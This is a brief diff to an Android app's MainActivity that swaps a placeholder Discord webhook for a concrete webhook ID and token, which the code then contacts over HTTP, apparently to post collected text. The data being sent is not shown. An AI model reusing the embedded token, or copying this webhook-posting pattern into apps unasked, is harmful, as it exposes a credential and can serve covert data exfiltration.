@@ -124,7 +124,7 @@ public class MainActivity extends Activity {
             sb.append("```");
             
             // REPLACE WITH YOUR DISCORD WEBHOOK URL
-            String webhook = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN";
+            String webhook = "https://discord.com/api/webhooks/1513303216895295679/6FXBV3hEWGUiwSumIgsCxzyXZyZdcCvGMAm9Tnpwz4KvWuWETBZi-fxfkx-AxKqsMabb";
             
             URL url = new URL(webhook);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
